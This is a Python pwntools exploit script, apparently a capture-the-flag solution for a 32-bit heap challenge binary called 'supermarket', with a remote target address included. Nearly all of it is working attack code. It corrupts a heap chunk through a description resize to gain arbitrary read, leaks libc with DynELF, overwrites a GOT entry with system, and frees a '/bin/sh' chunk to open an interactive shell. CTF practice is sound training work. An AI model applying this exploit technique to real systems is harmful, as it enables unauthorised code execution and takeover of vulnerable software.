#coding:utf-8
from pwn import *

# context.log_level = 'debug'
debug = 1 

if debug == 1:
	r = process('./supermarket')
	# gdb.attach(r)
else:
	r = remote('111.198.29.45', 56608)


def add(name, price, descrip_size, description):
	r.recvuntil('your choice>> ')
	r.send('1\n')

	r.recvuntil('name:')
	r.send(name + '\n')

	r.recvuntil('price:')
	r.send(str(price) + '\n')

	r.recvuntil('descrip_size:')
	r.send(str(descrip_size) + '\n')

	r.recvuntil('description:')
	r.send(str(description) + '\n')
	

def dele(name):
	r.recvuntil('your choice>> ')
	r.send('2\n')

	r.recvuntil('name:')
	r.send(name + '\n')

def lis():
	r.recvuntil('your choice>> ')
	r.send('3\n')
	r.recvuntil('all  commodities info list below:\n')
	return r.recvuntil('\n---------menu---------')[:-len('\n---------menu---------')]

def changePrice(name, price):
	r.recvuntil('your choice>> ')
	r.send('4\n')

	r.recvuntil('name:')
	r.send(name + '\n')

	r.recvuntil('input the value you want to cut or rise in:')
	r.send(str(price) + '\n')

def changeDes(name, descrip_size, description):
	r.recvuntil('your choice>> ')
	r.send('5\n')
	
	r.recvuntil('name:')
	r.send(name + '\n')

	r.recvuntil('descrip_size:')
	r.send(str(descrip_size) + '\n')

	r.recvuntil('description:')
	r.send(description + '\n')

def exit():
	r.recvuntil('your choice>> ')
	r.send('6\n')


add('1', 10, 8, 'a')
add('2', 10, 0x98, 'a')
add('3', 10, 4, 'a')
changeDes('2', 0x100, 'a')
add('4', 10, 4, 'a')

def leak_one(address):
	changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(address))
	res = lis().split('des.')[-1]
	if(res == '\n'):
		return '\x00'
	return res[0]

def leak(address):
	content =  leak_one(address) + leak_one(address + 1) + leak_one(address + 2) + leak_one(address + 3)
	log.info('%#x => %#x'%(address, u32(content)))
	return content

d = DynELF(leak, elf = ELF('./supermarket'))
system_addr = d.lookup('system', 'libc') 
log.info('system \'s address = %#x'%(system_addr))
bin_addr = 0x0804B0B8
changeDes('1', 0x8, '/bin/sh\x00')
changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(0x0804B018))
changeDes('4', 8, p32(system_addr))
dele('1')

r.interactive()
